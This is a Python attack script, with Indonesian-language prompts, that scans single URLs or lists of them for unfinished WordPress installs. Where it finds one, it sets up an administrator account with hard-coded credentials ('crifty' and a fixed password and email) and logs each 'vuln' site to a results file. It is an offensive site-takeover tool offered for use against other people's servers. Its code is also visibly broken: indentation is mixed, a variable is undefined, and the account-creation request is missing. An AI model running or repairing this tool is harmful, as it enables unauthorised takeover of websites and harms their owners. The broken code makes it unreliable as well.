from concurrent.futures import ThreadPoolExecutor as wr
import requests as r, os, sys, re
from os.path import exists as adagak

clear = lambda: os.system("cls") if "cmd" in sys.platform.lower() else os.system("clear")

def saved():
	files = input("[=] Save result: ")
	while adagak(files):
		print("[=] File tersebut sudah ada")
		yt = input("[?] Ingin menimpa hasil? [Y/T]: ")
		if yt in list("Yy"):
			return files
		elif yt in list("Tt"):
			files = input("[=] Save result: ")
			continue
		else:
			files = input("[=] Save result: ")
			continue
	return files

def ceks():
	fileip = input("[?] File list url: ")
	while True:
		try:
			check = open(fileip, "r").read().strip().split("\n")
		except FileNotFoundError:
			print("[!] File not found")
			fileip = input("[?] File list url: ")
			continue
		break
	return check

def runner(tar, save):
  tar = tar + "/"
	rws = re.findall("(https?://.*?/)", tar)[0]
	ses = r.Session()
	try:
		check = ses.get(rws+"wp-admin/install.php", headers={"user-agent": "chrome"}).text
		if "install-css" in str(check):
			if "<form" in str(check) or "id_ID" in str(check):
				form_one = ses.post(rws+"wp-admin/install.php?step=1", data={"language": "id_ID"}, headers={"user-agent": "chrome"}).text 
				coy_params = {
					"weblog_title": "web+saya",
					"user_name": "crifty",
					"admin_password": "balmond'='123",
					"admin_password2": "balmond'='123",
					"admin_email": "criftycraft@protonmail.com",
					"blog_public": "0",
					"Submit": "Instal+WordPress",
					"language": "id_ID"
				}
				if "WordPress telah diinstal" in str(run_now) or "Already Installed" in str(run_now):
					print("  \x1b[1;92m "+rws+"wp-admin/install.php#crifty@balmond'='123$criftycraft@protonmail.com \x1b[1;97m->\x1b[1;97m vuln \x1b[1;00m")
					with open(save, "a+") as wr:
						wr.write(f"=> {rws}wp-admin/install.php\n  > username: crifty\n  > password: balmond'='123\n  > email: criftycraft@protonmail.com\n\n")
				else:
					print("  \x1b[1;91m "+rws+"wp-admin/install.php#crifty@balmond'='123$criftycraft@protonmail.com \x1b[1;97m->\x1b[1;93m unknown \x1b[1;00m")
			else:
				print("  \x1b[1;91m "+rws+"wp-admin/install.php \x1b[1;97m->\x1b[1;93m Already Installed \x1b[1;00m")
		else:
			print("  \x1b[1;91m "+rws+"wp-admin/install.php \x1b[1;97m->\x1b[1;91m not vuln \x1b[1;00m")
	except:
		print("  \x1b[1;91m "+rws+"wp-admin/install.php \x1b[1;97m->\x1b[1;91m not vuln \x1b[1;00m")


def start_menu():
	print("""
[?] Choose menu:
	1. Single checker wp-install
	2. Multi checker wp-install
	""")
	pil = input("[?] Choose: ")
	while pil == "":
		print("[>] Not found")
		pil = input("[?] Choose: ")
	if pil == "1":
		single()
	elif pil == "2":
		multi()
	else:
		exit("[?] Not found\n")

def single():
	ipd = input("[?] Input target: ")
	while ipd == "":
		ipd = input("[?] Input target: ")
	name_save = saved()
	print("[!] Wait in process\n")
	runner(ipd, name_save)
	exit("\n[✓] Process Done.. enjoy\n")

def multi():
	name_multi = ceks()
	file_save = saved()
	print("[!] Wait in process\n")

	with wr(max_workers=10) as check:
		for cont in name_multi:
			check.submit(runner, cont, file_save)
	exit("\n[✓] Process Done.. enjoy\n")

if __name__=="__main__":
	clear()
	start_menu()
